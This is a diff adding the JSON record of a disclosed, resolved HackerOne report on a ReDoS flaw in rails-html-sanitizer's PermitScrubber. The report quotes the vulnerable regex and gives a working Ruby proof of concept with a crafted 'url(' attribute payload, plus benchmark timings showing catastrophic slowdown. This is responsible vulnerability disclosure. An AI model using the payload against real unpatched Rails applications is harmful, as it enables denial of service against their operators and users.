@@ -1,0 +1,119 @@
+{
+  "id": 1684163,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjg0MTYz",
+  "url": "https://hackerone.com/reports/1684163",
+  "title": "ReDoS (Rails::Html::PermitScrubber.scrub_attribute)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-30T02:48:16.070Z",
+  "submitted_at": "2022-08-30T02:48:16.082Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-23514",
+    "CVE-2022-23517"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-01-02T13:22:09.017Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-01-02T11:46:17.369Z",
+  "team_member_agreed_on_going_public_at": "2023-01-02T13:22:08.868Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have confirmed that ReDoS occurs on `Rails::Html::PermitScrubber.scrub_attribute`.\n\nhttps://github.com/rails/rails-html-sanitizer/blob/v1.4.3/lib/rails/html/scrubbers.rb#L134\n\n```ruby\n      def scrub_attribute(node, attr_node)\n        attr_name = if attr_node.namespace\n                      \"#{attr_node.namespace.prefix}:#{attr_node.node_name}\"\n                    else\n                      attr_node.node_name\n                    end\n\n        ...\n        if Loofah::HTML5::SafeList::SVG_ATTR_VAL_ALLOWS_REF.include?(attr_name)\n          attr_node.value = attr_node.value.gsub(/url\\s*\\(\\s*[^#\\s][^)]+?\\)/m, ' ') if attr_node.value\n        end\n```        \n\n`/url\\s*\\(\\s*[^#\\s][^)]+?\\)/m` is where the problem occurs. \n\n---\n\n### PoC\n\n```ruby\n# Gemfile\ngem 'rails-html-sanitizer', '~> 1.4', '>= 1.4.3'\n```\n\nscrub_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'rails-html-sanitizer'\n\ndef scrub(length)\n  scrubber = Rails::Html::PermitScrubber.new\n  scrubber.tags = ['s']\n  scrubber.attributes = ['mask']\n\n  mask =  'url(uu' * length\n\n  html_fragment = Loofah.fragment('<s mask=\"' + mask + '\" id=\"aa\">aa</s>')\n  html_fragment.scrub!(scrubber)\nend\n\nBenchmark.bm do |x|\n  x.report { scrub(10) }\n  x.report { scrub(100) }\n  x.report { scrub(1000) }\n  x.report { scrub(10000) }\n  x.report { scrub(100000) }\nend\n```\n\n```\n❯ bundle exec ruby scrub_benchmark.rb\n       user     system      total        real\n   0.000208   0.000020   0.000228 (  0.000226)\n   0.000316   0.000001   0.000317 (  0.000320)\n   0.023582   0.000039   0.023621 (  0.023653)\n   2.430801   0.007312   2.438113 (  2.446419)\n 233.864668   0.498743 234.363411 (234.632421)\n```\n\n## Impact\n\nReDoS may occur if scrub is executed in Rails::Html::PermitScrubber.\n\nHowever, one of the values [Loofah::HTML5::SafeList::SVG_ATTR_VAL_ALLOWS_REF](https://github.com/flavorjones/loofah/blob/v2.18.0/lib/loofah/html5/safelist.rb#L583) must be set in `attributes`.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-02-01T11:46:17.435Z",
+  "allow_singular_disclosure_after": -102489445.64340913,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "jumpydata",
+    "zy9ard3",
+    "shubham_srt",
+    "khizer47",
+    "shivammusic",
+    "c1mask",
+    "mehrin",
+    "papoo",
+    "anonymous_26",
+    "alysia",
+    "and 1 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
